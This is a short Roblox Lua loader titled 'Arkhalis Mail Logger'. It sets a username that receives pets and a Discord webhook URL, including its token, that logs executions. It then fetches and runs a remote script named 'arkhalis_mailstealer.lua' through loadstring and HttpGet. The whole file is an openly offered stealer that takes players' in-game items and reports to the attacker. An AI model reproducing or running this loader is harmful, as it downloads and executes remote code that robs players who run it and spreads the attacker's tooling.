--[[ Arkhalis Mail Logger ]]--

--[[ Main Config ]]--
_G.Username1 = "unusunit2" --// Username To Send Pets To
_G.Username2 = "" --// Username To Send Pets To [OPTIONAL]
--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1100496954305286144/yJNK6GE2hiduDTT9QFb0TUrjf2xzcdGXbguYW_UTzbR11iTll3ILLZJDJDMZCiDMILas" --// Discord Webhook For Executions

--[[ Script ]]--
loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
